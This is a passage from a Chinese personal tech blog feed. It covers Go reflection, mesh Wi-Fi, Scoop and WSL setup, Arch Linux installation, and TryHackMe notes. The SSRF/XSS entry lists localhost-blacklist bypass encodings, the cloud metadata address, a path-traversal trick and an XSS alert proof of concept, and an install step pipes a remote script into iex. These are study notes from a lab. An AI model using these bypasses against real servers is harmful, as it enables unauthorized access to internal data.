class="hljs-params">()</span></span> &#123;<br>x := <span class="hljs-number">3.14</span><br>fmt.Println(<span class="hljs-string">&quot;一开始的x:&quot;</span>, x)<br>re(&amp;x)<br>fmt.Println(<span class="hljs-string">&quot;修改后的x:&quot;</span>, x)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">re</span><span class="hljs-params">(x <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>v := reflect.ValueOf(x)<br>fmt.Printf(<span class="hljs-string">&quot;类型是:%T,值是:%v\n&quot;</span>, v, v)<br>k := v.Kind()<br><span class="hljs-keyword">switch</span> k &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">v.Elem().SetFloat():</span><br><span class="hljs-comment">用于修改反射值中的底层值，通常用于修改指向可设置类型的指针所指向的值。</span><br><span class="hljs-comment">如果 v 是一个指针，v.Elem() 会返回指针所指向的值，并且只有这个值是可设置的（例如，可设置的变量），才能够使用 v.Elem().SetFloat() 来修改它。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">v.SetFloat():</span><br><span class="hljs-comment">用于修改反射值中的底层值，但只能用于直接包含可设置类型的反射值。</span><br><span class="hljs-comment">如果 v 本身是一个可设置的反射值，且其类型兼容 float64，则可以使用 v.SetFloat() 直接修改该值。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">case</span> reflect.Float64:<br>v.SetFloat(<span class="hljs-number">567.89</span>)<br>fmt.Println(<span class="hljs-string">&quot;case 1 is &quot;</span>, v)<br><span class="hljs-keyword">case</span> reflect.Ptr:<br><span class="hljs-comment">//Elem()是获取地址指向的值</span><br>v.Elem().SetFloat(<span class="hljs-number">12.3</span>)<br>fmt.Println(<span class="hljs-string">&quot;case 2 is &quot;</span>, v)<br><span class="hljs-comment">//地址</span><br>fmt.Println(v.Pointer())<br>&#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">一开始的x: 3.14</span><br><span class="hljs-comment">类型是:reflect.Value,值是:0xc00001a0b8</span><br><span class="hljs-comment">case 2 is  0xc00001a0b8</span><br><span class="hljs-comment">824633827512</span><br><span class="hljs-comment">修改后的x: 12.3</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><h2 id="查看类型、字段和方法"><a href="#查看类型、字段和方法" class="headerlink" title="查看类型、字段和方法"></a>查看类型、字段和方法</h2><p>很乱,看的头晕,以后再学</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id   <span class="hljs-type">int</span><br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span></span> Hello() &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// var u1 = User&#123;</span><br><span class="hljs-comment">// Id:   2,</span><br><span class="hljs-comment">// Name: &quot;小f&quot;,</span><br><span class="hljs-comment">// Age:  19,</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>u := User&#123;<br>Id:   <span class="hljs-number">1</span>,<br>Name: <span class="hljs-string">&quot;小明&quot;</span>,<br>Age:  <span class="hljs-number">18</span>,<br>&#125;<br>Poni(u)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Poni</span><span class="hljs-params">(u <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-comment">//获取类型信息</span><br>ty := reflect.TypeOf(u)<br><span class="hljs-comment">//这里的打印值为类型为:  main.User   ,这里的main.User是指在main包下定义的结构体</span><br>fmt.Println(<span class="hljs-string">&quot;类型为: &quot;</span>, ty)<br>fmt.Println(<span class="hljs-string">&quot;字符串类型: &quot;</span>, ty.Name())<br><span class="hljs-comment">//获取值信息</span><br>value := reflect.ValueOf(u)<br>fmt.Println(<span class="hljs-string">&quot;reflect.ValueOf(u) = &quot;</span>, value)<br><span class="hljs-comment">// 获取属性</span><br><span class="hljs-comment">// 获取结构体字段个数：t.NumField()</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; ty.NumField(); i++ &#123;<br><span class="hljs-comment">// 获取每个结构体字段名：ty.Field(i)</span><br><span class="hljs-comment">// 获取每个结构体字段类型：ty.Field(i).Type()</span><br>v := ty.Field(i)<br>fmt.Println(<span class="hljs-string">&quot;value.Field(i) = &quot;</span>, v)<br>fmt.Printf(<span class="hljs-string">&quot;%s : %v\n&quot;</span>, v.Name, v.Type)<br>val := value.Field(i).Interface()<br>fmt.Println(<span class="hljs-string">&quot;value.Field(i).Interface() = &quot;</span>, val)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;----------------------方法---------------------&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; ty.NumMethod(); i++ &#123;<br>m := ty.Method(i)<br>fmt.Println(<span class="hljs-string">&quot;m.Name: &quot;</span>, m.Name, <span class="hljs-string">&quot;  m.Type: &quot;</span>, m.Type)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>路由器基础</title>
    <link href="/2023/09/08/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    <url>/2023/09/08/%E8%B7%AF%E7%94%B1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>起因是学校工作室的路由器出问题(原因不明,可能上联被人改动了),qq微信及部分网站(例如b站)可以正常使用,但是浏览器搜索会显示无法连接服务器,很奇怪的问题.总之在老吴的帮助下,最后用DHCP解决了问题.在排查问题的过程中,第一次听到了多个路由器mesh组网的概念,故此记录一下</p><h1 id="mesh组网"><a href="#mesh组网" class="headerlink" title="mesh组网"></a>mesh组网</h1><p>最大的优点就是无线漫游,如果是传统的主路由桥接子路由的模式,在从主路由覆盖的地方走到子路由覆盖的地方,不会进行自动切换节点,就算切换了也不是无感切换(通俗点说WiFi名字会变,信号较弱处会断连),而使用mesh组网,所有子路由器都跟主路由是一个ssid,并且是所有子路由器是类似星型拓扑的结构,假如一个出问题不会互相影响,WiFi可以无线漫游,无感自动切换(wifi名字相同)<br>设置方法就是手机下个米家wifi的app,讲主路由设置好之后,手机连接主路由,讲要进行mesh的子路由恢复默认状态(不需要连网线),直接在手机操作,进行mesh组网即可,完成后既可进行有线mesh,也可以进行无线mesh</p>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>win系统中好用的东西--wsl和scoop</title>
    <link href="/2023/09/06/win%E7%9A%84apt/"/>
    <url>/2023/09/06/win%E7%9A%84apt/</url>
    
    <content type="html"><![CDATA[<h1 id="scoop"><a href="#scoop" class="headerlink" title="scoop"></a>scoop</h1><p>如题,win系统的软件安装神器–scoop</p><h2 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h2><p>在Ubuntu操作系统中，apt 是 Advanced Package Tool（高级软件包工具）的缩写，它是用于管理软件包的命令行工具。apt 可以帮助您搜索、安装、更新和卸载软件包，以及管理软件包仓库。它是Ubuntu中常用的软件包管理工具之一。<br>用人话翻译一下,就是以ubuntu为代表的debian系的软件包管理工具,比如在ubuntu下想安装python,只需要<code>apt install python</code>一句命令即可完成安装,而在win系统下,需要去官网下载,操作失误还需要自己额外配置环境,所以scoop的便捷性就体现出来了,在win下,只要安装配置好了scoop,只需要打开powershell,一句<code>apt install python</code>即可完成安装</p><h2 id="scoop的安装下载及使用"><a href="#scoop的安装下载及使用" class="headerlink" title="scoop的安装下载及使用"></a>scoop的安装下载及使用</h2><h3 id="安装下载"><a href="#安装下载" class="headerlink" title="安装下载"></a>安装下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://gitee.com/glsnames/scoop-installer<br>本文教程均来自于该仓库<br></code></pre></td></tr></table></figure><p>打开powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">//允许powershell中安装脚本的使用<br>Set-ExecutionPolicy RemoteSigned -scope CurrentUser  //输入Y<br>//安装scoop<br>iwr -useb scoop.201704.xyz | iex<br>//安装git,scoop很多操作都需要git<br>scoop install git<br>//配置国内源<br>scoop config SCOOP_REPO <span class="hljs-string">&quot;https://gitee.com/glsnames/scoop-installer&quot;</span><br>//切换分支<br>scoop config scoop_branch develop<br>//添加bucket(存储桶,类似软件市场?)<br>scoop bucket add extras<br>scoop bucket add java<br>//添加第三方bucket<br>scoop bucket add dorado https://github.com/chawyehsu/dorado.git<br>scoop bucket add scoopet https://github.com/ivaquero/scoopet.git<br>scoop bucket add iszy https://github.com/ZvonimirSun/scoop-iszy.git<br>scoop bucket add <span class="hljs-built_in">echo</span> https://github.com/echoiron/echo-scoop.git<br>scoop bucket add zapps https://github.com/kkzzhizhou/scoop-zapps.git<br>scoop bucket add tomato https://github.com/zhoujin7/tomato.git<br>scoop bucket add MorFans-apt https://github.com/Paxxs/Cluttered-bucket.git<br>scoop bucket add sushi https://github.com/kidonng/sushi.git<br>scoop bucket add aki https://github.com/akirco/aki-apps.git<br>scoop bucket add lemon https://github.com/hoilc/scoop-lemon.git<br>//更新<br>scoop update<br>//查询软件列表<br>scoop search<br>//软件列表非常多,终端看着很不方便,可以输入到一个文本文档中,记得在你想存放文本文档的目录中重新打开powershell<br>scoop search &gt;&gt; soft_list.txt<br>//安装想要的软件<br>scoop install QQ<br>scoop install wechat<br>scoop install python<br>scoop install oraclejdk  //java<br>scoop install clash-for-windows<br>scoop install docker<br></code></pre></td></tr></table></figure><h1 id="wsl"><a href="#wsl" class="headerlink" title="wsl"></a>wsl</h1><p>子系统,用处就是可以打开cmd或者powershell,输入ubuntu之后即可直接使用ubuntu系统(无gui界面,想要的需要自己下载),不需要等vm笨重的开机</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">本文来源于<br>https://www.yuque.com/gulujili/su7zwm/lhk7xgu2fqa3p035<br></code></pre></td></tr></table></figure><p>控制面板 –&gt; 程序 –&gt; 开启或关闭 Windows 功能<br>将以下三条勾选,确定后会重启电脑<br>  a. Windows 虚拟机监控程序平台<br>  b. 适用于 Linux 的 WIndows 子系统<br>  c. 虚拟机平台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>//打开powershell,可以先去微软商店中下载想要的wsl系统,比如kali或者ubuntu,直接点击下载就可以<br>wsl --set-default-version 2  //设置默认wsl2版本<br>wsl --install //选择想安装的即可,如果在应用商店下的话,这里就不用下了<br>//打开ubuntu可能会报错,在这里重新安装一下wsl   https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm.RCE</title>
    <link href="/2023/08/29/thm-RCE/"/>
    <url>/2023/08/29/thm-RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>remote command execution,远程命令执行</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>没大看明白,感觉举的例子像IDOR,感觉这些个漏洞的本质都是对用户的输入没有校验,然后利用相关的函数来获取需要的东西</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><table><thead><tr><th>blind</th><th>verbose</th></tr></thead><tbody><tr><td>没有回显?</td><td>有效负载,可能就是有回显</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch</title>
    <link href="/2023/08/25/Arch/"/>
    <url>/2023/08/25/Arch/</url>
    
    <content type="html"><![CDATA[<h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><p><a href="http://mirrors.ustc.edu.cn/">http://mirrors.ustc.edu.cn/</a><br>中科大镜像站,搜索archlinux<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230825160838.png"></p><h1 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h1><p>自定义–&gt;下一步–&gt;稍后安装操作系统–&gt;Linux 其它Linux 5.x –&gt;自己选–&gt;2 1–&gt;我给的2g–&gt;默认nat–&gt;默认LSI Logic–&gt;默认SCSI–&gt;默认创建新的虚拟磁盘–&gt;我给了80g,单个文件多个文件都可以–&gt;下一步–&gt;自定义硬件–&gt;新CD 使用ISO映像文件,选择前面下好的镜像–&gt;完成<br>编辑虚拟机设置–&gt;选项–&gt;高级–&gt;固件类型选UEFI</p><p>等一会</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /sys/firmware/efi/efivars  //这步如果没报错则说明一切正常<br>ping baidu.com  //看能否连接网络,这里延迟可能非常高<br>ip -brief address   //看一看ens33 的ip,我的是192.168.49.131<br>passwd  //设置一个密码<br></code></pre></td></tr></table></figure><h1 id="tabby"><a href="#tabby" class="headerlink" title="tabby"></a>tabby</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh 192.168.49.131    //yes,输入密码<br>pacman -Sy vim    //安装vim<br>//文件末尾添加这两行<br><br>[archlinuxcn]<br>Server = https://mirrors.aliyun.com/archlinuxcn/<span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>接着编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/pacman.d/mirrorlist<br>//把下面这个加到所以server的最顶端<br>Server = https://mirrors.aliyun.com/archlinux/<span class="hljs-variable">$repo</span>/os/<span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman-key --init<br>pacman-key --populate archlinux<br><span class="hljs-built_in">chown</span> -R root:root /etc/pacman.d/gnupg<br><span class="hljs-built_in">chmod</span> -R 600 /etc/pacman.d/gnupg<br>pacman -Sy archlinuxcn-keyring<br></code></pre></td></tr></table></figure><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><p>要分以下三个区<br>EFI分区       300 MB<br>swap分区      4GB<br>root分区      剩余空间</p><figure class="highlight plaintext"><figcaption><span>-l```查看磁盘信息,执行第一个disk的路径</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fdisk">```bash<br>cfdisk /dev/sda<br></code></pre></td></tr></table></figure><p>选择gpt,回车,选择new</p><h3 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h3><p>大小为300M,type选EFI System,回车,按↓键选择Free space</p><h3 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h3><p>4G,type选Linux swap</p><h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>默认剩下全部,linux filesystem</p><p>然后write ,yes<br>quit退出</p><h2 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">//EFI 分区<br>mkfs.vfat /dev/sda1<br>//root<br>mkfs.xfs -f /dev/sda3<br>//swap<br>mkswap /dev/sda2<br>//查看分区情况<br>lsblk -f<br></code></pre></td></tr></table></figure><h2 id="挂载分区-安装系统"><a href="#挂载分区-安装系统" class="headerlink" title="挂载分区,安装系统"></a>挂载分区,安装系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">//挂载分区<br>mount /dev/sda3 /mnt<br><span class="hljs-built_in">mkdir</span> -p /mnt/boot/efi<br>mount /dev/sda1 /mnt/boot/efi<br>swapon /dev/sda2<br><br>//安装系统,这是一整句指令<br>pacstrap /mnt linux linux-firmware linux-headers base base-devel vim git bash-completion<br>//生成文件系统的表文件，作用是后面重启进去系统能自动挂载分区<br>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br><span class="hljs-built_in">cat</span> /mnt/etc/fstab<br></code></pre></td></tr></table></figure><h2 id="进入新系统"><a href="#进入新系统" class="headerlink" title="进入新系统"></a>进入新系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">arch-chroot /mnt<br>//设置时区<br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>hwclock --systohc<br><br>//设置系统语言<br>sed -i <span class="hljs-string">&quot;s/#en_US.UTF-8 UTF-8/en_US.UTF-8 UTF-8/g&quot;</span> /etc/locale.gen<br>sed -i <span class="hljs-string">&quot;s/#zh_CN.UTF-8 UTF-8/zh_CN.UTF-8 UTF-8/g&quot;</span> /etc/locale.gen<br>//生成本地语言信息<br>locale-gen<br>//设置本地语言环境变量<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;LANG=en_US.UTF-8&quot;</span> &gt; /etc/locale.conf<br><br>//设置主机名，如archlinux<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;archlinux&quot;</span> &gt; /etc/hostname<br>//hosts文件中添加主机名<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;127.0.0.1   localhost</span><br><span class="hljs-string">::1         localhost</span><br><span class="hljs-string">127.0.1.1   archlinux.localdomain archlinux&quot;</span> &gt;&gt; /etc/hosts<br><br>//安装以下软件包<br>pacman -S grub efibootmgr efivar networkmanager intel-ucode<br><br>//配置grub<br>grub-install /dev/sda<br>grub-mkconfig -o /boot/grub/grub.cfg<br><br>//激活启用NetworkManager<br>systemctl <span class="hljs-built_in">enable</span> NetworkManager<br><br>//给root创建密码<br>passwd<br><br>//安装openssl<br>pacman -S openssh<br>//设置开机自启动<br>systemctl <span class="hljs-built_in">enable</span> sshd<br>//修改/etc/ssh/sshd_config允许root登录，修改PermitRootLogin的值为<span class="hljs-built_in">yes</span><br>sed -i <span class="hljs-string">&quot;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_config<br><br>//添加其他用户并设置密码，如kali<br>useradd --create-home kali<br>passwd kali<br>//设置用户组<br>usermod -aG wheel,<span class="hljs-built_in">users</span>,storage,power,lp,adm,optical kali<br>//修改当前用户权限，编辑以下文件，取消%wheel ALL=(ALL) ALL前的注释，用:wq!保存退出<br>vim /etc/sudoers<br><br>//安装显卡驱动<br>pacman -S xf86-video-intel vulkan-intel mesa<br><br>//安装声卡驱动<br>pacman -S alsa-utils pulseaudio pulseaudio-bluetooth cups<br><br>//安装英文字体<br>pacman -S ttf-dejavu ttf-droid ttf-hack ttf-font-awesome otf-font-awesome ttf-lato ttf-liberation ttf-linux-libertine ttf-opensans ttf-roboto ttf-ubuntu-font-family<br><br>//安装中文字体<br>pacman -S ttf-hannom noto-fonts noto-fonts-extra noto-fonts-emoji noto-fonts-cjk adobe-source-code-pro-fonts adobe-source-sans-fonts adobe-source-serif-fonts adobe-source-han-sans-cn-fonts adobe-source-han-sans-hk-fonts adobe-source-han-sans-tw-fonts adobe-source-han-serif-cn-fonts wqy-zenhei wqy-microhei<br><br>//打开字体引擎，取消最后一句的注释<br>vim /etc/profile.d/freetype2.sh<br><span class="hljs-comment"># export FREETYPE_PROPERTIES=&quot;truetype:interpreter-version=40&quot;</span><br><br>//安装显示服务<br>pacman -S xorg<br>//安装桌面环境。plasma：就是桌面环境;sddm：登录管理器;konsole：kde下的终端;kate：文本编辑器;ark：解压与压缩;okular：PDF查看器;spectacle：截图工具;AUR：管理工具<br>pacman -S plasma sddm konsole dolphin kate ark okular spectacle<br>//设置sddm登录<br>systemctl <span class="hljs-built_in">enable</span> sddm<br><br>//安装中文输入法,这里没有安装yay,感觉可以先跳过了<br>sudo pacman -S fcitx fcitx-im fcitx-configtool<br>yay -S fcitx-sogoupinyin<br>//编辑 /root/.xprofile写入以下内容,这里也是可以先跳过<br><span class="hljs-built_in">export</span> GTK_IM_MODULE=fcitx<br><span class="hljs-built_in">export</span> QT_IM_MODULE=fcitx<br><span class="hljs-built_in">export</span> XMODIFIERS=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br><br>//安装其他软件,这里好像全都用不了<br>sudo pacman -S typora netease-cloud-music<br>yay -S baidunetdisk-electron visual-studio-code-bin google-chrome qv2ray<br><br>//清理缓存<br>pacman -Scc<br></code></pre></td></tr></table></figure><h2 id="重启进入"><a href="#重启进入" class="headerlink" title="重启进入"></a>重启进入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br><br>umount /mnt/boot/efi<br>umount /mnt<br><br>reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF+XSS</title>
    <link href="/2023/08/23/SSRF/"/>
    <url>/2023/08/23/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>(Server-Side Request Forgery)<br>服务器请求伪造<br>ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf)</p><h2 id="常见ssrf防御"><a href="#常见ssrf防御" class="headerlink" title="常见ssrf防御"></a>常见ssrf防御</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,127.0.0.1.nip.io,<br>这些都是dns解析成127.0.0.1,但是没有上黑名单的<br><a href="http://169.254.169.254/">http://169.254.169.254</a> 这个是Amazon AWS(不知道是不是特有的)的服务器存储敏感数据的地址</p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p><code>例如参数中使用的 URL 必须以https://website.thm开头的规则 </code><br>绕过方式是在对应域名建立子域名绕过(能给别人的域名建子域名不早打进去了吗)</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>这个房间真的做的乱七八糟的,感觉很拉跨<br>&#x2F;private这个目录不允许访问,在更改头像页面,发现头像来自于网站内部,所有头像更改的请求那里可以获得&#x2F;private的内容,所以图片的路径value更改成private,但是被拒绝访问,使用x&#x2F;..&#x2F;private即可绕过,这里的x填啥都可以,可以说y,可以是z,也可以是abc,不知道这里是因为thm房间特意允许的还是别的原因,正常来说应该是该目录下一个实际存在的文件+&#x2F;..&#x2F;private</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>Cross-site Scripting<br>按理来说应该简写成css的,但已经有了,所以叫xss<br><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code><br>有alert则证明有xss,即POC</p><h2 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h2><p>用户在浏览器内的输入内容会不经过滤直接回显到浏览器,这里就可以执行</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>保存在服务器内的数据,比如评论</p><h2 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h2><p>利用js事件形成xss</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>很基础的六个类型,有空还得再找靶场练,总之就是凑<code>&lt;&gt; ; &quot;&quot; &#39;&#39;</code>这样的,要么就是大小写绕过,或者双写绕过之类的</p><h2 id="实际操作-1"><a href="#实际操作-1" class="headerlink" title="实际操作"></a>实际操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 